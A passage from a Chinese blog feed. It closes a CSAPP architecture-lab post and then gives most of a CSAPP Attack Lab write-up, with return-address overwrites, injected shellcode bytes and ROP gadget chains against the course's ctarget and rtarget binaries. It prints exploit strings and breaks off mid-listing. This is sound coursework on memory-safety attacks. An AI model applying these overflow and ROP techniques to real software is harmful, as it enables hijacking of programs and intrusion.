perl">mrmov<span class="hljs-string">q (%rdi)</span>, %r8<br>mrmovq <span class="hljs-number">8</span>(%rdi), %r9<br>rmmovq %r8, (%rsi)<br>rmmovq %r9, <span class="hljs-number">8</span>(%rsi)<br></code></pre></td></tr></table></figure><p>源程序如下</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Loop header</span><br>    andq %rdx,%rdx      <span class="hljs-comment"># len &lt;= 0?</span><br>    jmp test<br>Loop:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r9<br>    andq %r8,%r8<br>    rmmovq %r8,(%rsi)<br>    rmmovq %r9,<span class="hljs-number">8</span>(%rsi)<br>    jle Loop1<br>    iaddq $1,%rax<br>Loop1:  <br>    andq %r9,%r9<br>    jle Loop2<br>    iaddq $1,%rax<br>Loop2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    mrmovq <span class="hljs-number">24</span>(%rdi),%r9<br>    andq %r8,%r8<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    rmmovq %r9,<span class="hljs-number">24</span>(%rsi)<br>    jle Loop3<br>    iaddq $1,%rax<br>Loop3:  <br>    andq %r9,%r9<br>    jle Loop4<br>    iaddq $1,%rax<br>Loop4:<br>    mrmovq <span class="hljs-number">32</span>(%rdi),%r8<br>    mrmovq <span class="hljs-number">40</span>(%rdi),%r9<br>    andq %r8,%r8<br>    rmmovq %r8,<span class="hljs-number">32</span>(%rsi)<br>    rmmovq %r9,<span class="hljs-number">40</span>(%rsi)<br>    jle Loop5<br>    iaddq $1,%rax<br>Loop5:<br>    iaddq $48,%rdi<br>    iaddq $48,%rsi      <br>    andq %r9,%r9<br>    jle test<br>    iaddq $1,%rax<br>test:<br>    iaddq $-<span class="hljs-number">6</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够6个</span><br>    jge Loop                <span class="hljs-comment"># 6路展开</span><br>    iaddq $6, %rdx<br>    jmp test2               <span class="hljs-comment">#剩下的</span><br><br>L:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    andq %r8,%r8<br>    rmmovq %r8,(%rsi)<br>    jle L1<br>    iaddq $1,%rax<br>L1:<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r8<br>    andq %r8,%r8<br>    rmmovq %r8,<span class="hljs-number">8</span>(%rsi)<br>    jle L2<br>    iaddq $1,%rax<br>L2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    iaddq $24,%rdi<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    iaddq $24,%rsi<br>    andq %r8,%r8<br>    jle test2<br>    iaddq $1,%rax<br>test2:<br>    iaddq $-<span class="hljs-number">3</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够3个</span><br>    jge L<br>    iaddq $2, %rdx          <span class="hljs-comment"># -1则不剩了，直接Done,0 剩一个, 1剩2个</span><br>    je R<span class="hljs-number">0</span><br>    jl Done<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r9<br>    rmmovq %r8,(%rsi)<br>    rmmovq %r9,<span class="hljs-number">8</span>(%rsi)<br>    andq %r8,%r8<br>    jle R2<br>    iaddq $1,%rax<br>R2:<br>    andq %r9,%r9<br>    jle Done<br>    iaddq $1,%rax<br>    jmp Done<br>R<span class="hljs-number">0</span>:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    andq %r8,%r8<br>    rmmovq %r8,(%rsi)<br>    jle Done<br>    iaddq $1,%rax<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Average</span> CPE     <span class="hljs-number">8</span>.<span class="hljs-number">16</span><br><span class="hljs-attribute">Score</span>   <span class="hljs-number">46</span>.<span class="hljs-number">7</span>/<span class="hljs-number">60</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>csapp第四章对于我来讲太难了，但在自己亲手设计指令的过程中能模拟流水线的工作流程并尝试优化，让我这个noob得以一窥处理器体系结构的冰山一角。</li><li>本lab同之前的lab一样，诚意满满，yas、yis、ssim、psim等模拟、测试工具一应俱全，整个过程如同游戏闯关一样令人着迷。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>architecure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp attack_lab</title>
    <link href="/2023/09/07/csapp-data-lab/"/>
    <url>/2023/09/07/csapp-data-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="The-Attack-Lab-Understanding-Buffer-Overflow-Bugs"><a href="#The-Attack-Lab-Understanding-Buffer-Overflow-Bugs" class="headerlink" title="The Attack Lab: Understanding Buffer Overflow Bugs"></a>The Attack Lab: Understanding Buffer Overflow Bugs</h1><p>在2个程序上对不同的安全漏洞生成5次攻击。这才是信息安全吗（xd</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230729210310548.png" alt="Figure 1: Summary of attack lab phases"></p><p>官方说明文档中指出了需要做的几个<code>phase</code></p><h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><code>test</code>函数的源码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br> <span class="hljs-type">int</span> val;<br> val = getbuf();<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数调用了<code>getbuf</code>函数</p><p>我们的攻击目标是改变程序第五行打印字符串这一行为，让程序返回到<code>touch1</code>。</p><p>touch1的c代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">void</span> <span class="hljs-title function_">touch1</span><span class="hljs-params">()</span><br> &#123;<br>vlevel = <span class="hljs-number">1</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch1!: You called touch1()\n&quot;</span>);<br>validate(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反汇编test"><a href="#反汇编test" class="headerlink" title="反汇编test"></a>反汇编<code>test</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function test:<br>   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp<br>   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax<br>   0x0000000000401971 &lt;+9&gt;:     call   0x4017a8 &lt;getbuf&gt;<br>   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx<br>   0x0000000000401978 &lt;+16&gt;:    mov    $0x403188,%esi<br>   0x000000000040197d &lt;+21&gt;:    mov    $0x1,%edi<br>   0x0000000000401982 &lt;+26&gt;:    mov    $0x0,%eax<br>   0x0000000000401987 &lt;+31&gt;:    call   0x400df0 &lt;__printf_chk@plt&gt;<br>   0x000000000040198c &lt;+36&gt;:    add    $0x8,%rsp<br>   0x0000000000401990 &lt;+40&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><h3 id="反汇编getbuf"><a href="#反汇编getbuf" class="headerlink" title="反汇编getbuf"></a>反汇编<code>getbuf</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function getbuf:<br>   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br>   0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;<br>   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax<br>   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp<br>   0x00000000004017bd &lt;+21&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>第二行分配了40个字节的栈帧。</p><p>运行到第五行时，栈内的情况如下：</p><table><thead><tr><th><code>test函数 的栈帧</code></th><th></th></tr></thead><tbody><tr><td></td><td><code>**返回地址</code>**</td></tr><tr><td><code>getbuf</code>函数的栈帧</td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><p>于是我们不难想到，只需要输入41个字节的字符，最后一个字节覆盖掉原来的返回地址，变为<code>touch1</code>的地址，这样程序就会跳转。</p><p>查看<code>touch1</code>的地址为0x4017c0</p><h3 id="创建exploit-string"><a href="#创建exploit-string" class="headerlink" title="创建exploit string"></a>创建exploit string</h3><p>使用工具<code>HEX2RAW</code>，从txt生成文本，详见官方文档。（注意使用小端存储</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230729222029134.png" alt="exploit txt"></p><p>攻击成功</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">./ctarget -qi <span class="hljs-built_in">a1</span>.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230729222132333.png" alt="attack"></p><h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val)</span><br>&#123;<br>    vlevel = <span class="hljs-number">2</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>    <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>        &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>文档指出：不仅需要返回修改地址调用<code>touch2</code>，还需要把<code>cookie</code>作为参数传入，且不建议使用<code>jmp</code>和<code>call</code>指令进行跳转，只能通过在栈中保存目标代码的地址，以<code>ret</code>的形式进行跳转。</p><p>不难想到，PC程序寄存器，<code>%rip</code>，时刻指向程序要执行的下一条指令在内存中的位置，而<code>ret</code>指令就相当于<code>pop %rip</code>。把栈中存放的地址弹出作为下下一条指令的地址。</p><p>函数的第一个参数放在<code>%rdi</code>寄存器中，需要使用汇编语言实现，其思路如下：</p><ul><li>将正常返回地址设置成注入代码的地址，直接在栈顶注入</li><li><code>cookie</code>的值写在<code>%rdi</code>里</li><li>获取<code>touch2</code>的首地址</li><li>在<code>ret</code>弹出前将<code>touch2</code>地址压入栈</li></ul><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230730104234922.png" alt="汇编"></p><p>使用<code>gcc</code>编译，在使用<code>objdump</code>反汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi<br>   7:   68 ec 17 40 00          push   $0x4017ec<br>   c:   c3                      ret<br></code></pre></td></tr></table></figure><p>使用<code>gdb</code>下断点判断<code>rsp</code>中的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) break getbuf<br>Breakpoint 1 at 0x4017a8: file buf.c, line 12.<br>(gdb) r -qi a1.txt<br>Starting program: /home/hydra/target1/ctarget -qi a1.txt<br>Cookie: 0x59b997fa<br>Breakpoint 1, getbuf () at buf.c:12<br>12      buf.c: No such file or directory.<br>(gdb) disas<br>Dump of assembler code for function getbuf:<br>=&gt; 0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br>   0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;<br>   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax<br>   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp<br>   0x00000000004017bd &lt;+21&gt;:    ret<br>End of assembler dump.<br>(gdb) stepi<br>14      in buf.c<br>(gdb) p/x $rsp<br>$1 = 0x5561dc78<br></code></pre></td></tr></table></figure><p><code>0x5561dc78</code>即是我们要修改的返回地址。</p><p>程序在执行完<code>getbuf</code>的ret后，<code>%rsp</code>指向<code>caller</code>的返回地址，但这个时候，返回地址的已经被我们修改为<code>0x5561dc78</code>，而这个地址存放的应该是我们写的代码</p><p>那么exploit txt即为</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230730105051596.png" alt="exploit txt"></p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230730105431531.png" alt="attack"></p><h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h2><p>Phase 3 also involves a code injection attack, but passing a string as argument.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch3</span><span class="hljs-params">(<span class="hljs-type">char</span> *sval)</span><br>&#123;<br>    vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>    <span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>        fail(<span class="hljs-number">3</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>touch3</code>调用了<code>hexmatch</code>，其c语言表示为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Compare string to hex represention of unsigned value */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">hexmatch</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val, <span class="hljs-type">char</span> *sval)</span><br>&#123;<br>    <span class="hljs-type">char</span> cbuf[<span class="hljs-number">110</span>];<br>    <span class="hljs-comment">/* Make position of check string unpredictable */</span><br>    <span class="hljs-type">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%.8x&quot;</span>, val);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>s的为位置是随机的，在<code>getbuf</code>栈中的字符串很有可能被覆盖，所以需要将cookie的字符产存在<code>test</code>的栈上。</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230731195731475.png" alt="test栈顶指针位置"></p><p><code>0x5561dca8</code>，就是字符串需要存放的地址，也是调用<code>touch3</code>应该传入的参数，touch3的地址是<code>0x4018fa</code>，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi<br>   7:   68 fa 18 40 00          push   $0x4018fa<br>   c:   c3                      ret<br></code></pre></td></tr></table></figure><p>此时的栈帧为：</p><table><thead><tr><th>test函数的栈帧</th><th>“cookie”</th></tr></thead><tbody><tr><td></td><td>0x5561dc78</td></tr><tr><td>getbuf的栈帧</td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td>ret</td></tr><tr><td></td><td>push   $0x4018fa</td></tr><tr><td>0x5561dc78</td><td>mov    $0x5561dca8,%rdi</td></tr></tbody></table><ul><li>g<code>etbuf</code>执行<code>ret</code>，从栈中弹出返回地址，跳转到注入代码</li><li>代码执行，先将在<code>caller</code>中的栈中字符传给<code>%rdi</code>，将touch3的地址压入栈</li><li>代码执行<code>ret</code>，从栈中弹出<code>touch3</code>指令，成功跳转。</li></ul><p><code>cookie</code>转为<code>ascii</code>为：<code>35 39 62 39 39 37 66 61</code></p><p>test栈帧多利用一个字节位置存放cookie，所以需要输入56个字节。</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230731202129520.png" alt="phase3成功"></p><h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h2><p>在这一部分我们需要攻击<code>rtarget</code>，其需要我们使用ROP攻击策略，在已存在的程序中找到特定的以<code>ret</code>结尾的指令序列，这样一段代码成为<code>gadget</code>。将需要用到的部分压入栈，每次<code>ret</code>都取出一个新的<code>gadge</code>t，形成一个程序链。</p><p>在本phase中我们需要实现phase2，要求返回到touch2函数，phase2的注入代码是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq    $0x59b997fa, %rdi<br>pushq   $0x4017ec<br>ret<br></code></pre></td></tr></table></figure><p>首先不可能找到带有立即数的<code>gadget</code>，所以考虑将<code>cookie</code>放入栈中，然后用<code>pop</code>到寄存器rdi，但发现farm中没有 <code>5f</code>，所以需要做转换，先到<code>rax</code>，再到<code>rdi</code>。</p><p>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">popq %rax<br>ret<br><br>movq %rax, %rdi<br>ret<br></code></pre></td></tr></table></figure><ul><li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回值，跳转到<code>gadget01</code></li><li>将<code>cookie</code>弹出后 执行<code>ret</code>，跳到<code>gadget02</code></li><li>将<code>cookie</code>传到<code>rdi</code>，执行 <code>ret</code>,继续弹出地址跳到<code>touch2</code></li></ul><p>寻找需要的gadget代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019a7 &lt;addval_219&gt;:<br>  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax<br>  4019ad:c3                   ret<br></code></pre></td></tr></table></figure><p> 从0x4019ab开始</p><p><code>movq %rax, %rdi</code>表示为48 89 c7，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019c3 &lt;setval_426&gt;:<br>  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)<br>  4019c9:c3                   ret<br></code></pre></td></tr></table></figure><p>得到指令 0x4019c5</p><p>那么文本为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">c5</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230731223943574.png" alt="image-20230731223943574"></p><h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><p>Phase_3中注入代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq    $0x5561dca8, %rdi<br>pushq   $0x4018fa<br>ret<br></code></pre></td></tr></table></figure><p><code>0x5561dca8</code>是栈中存cookie的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019d6 &lt;add_xy&gt;:<br>  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax<br>  4019da:c3                   ret<br></code></pre></td></tr></table></figure><p>而本phase中的栈的地址是随机的，只能在代码中获取<code>rsp</code>的地址 ，根据偏移量确定cookie的地址。</p><ul><li>先取得<code>rsp</code>的值</li><li>去除存在栈中的偏移量</li><li>通过<code>lea (%rdi,%rsi,1),%rax</code>得到cookie的地址</li><li>cookie传给<code>%rdi</code></li><li>调用<code>touch3</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov %rsp，%rax 0x401aad<br>0000000000401aab &lt;setval_350&gt;:<br>  401aab:c7 07 48 89 e0 90    movl   $0x90e08948,(%rdi)<br>  401ab1:c3                   ret <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#地址：0x401aad<br>movq %rsp, %rax<br>ret<br><br>#地址：0x4019a2<br>movq %rax, %rdi<br>ret<br><br>#地址：0x4019cc<br>popq %rax<br>ret<br><br>#地址：0x4019dd<br>movl %eax, %edx<br>ret<br><br>#地址：0x401a70<br>movl %edx, %ecx<br>ret<br><br>#地址：0x401a13<br>movl %ecx, %esi<br>ret<br><br>#地址：0x4019d6<br>lea    (%rdi,%rsi,1),%rax<br>ret<br><br>#地址：0x4019a2<br>movq %rax, 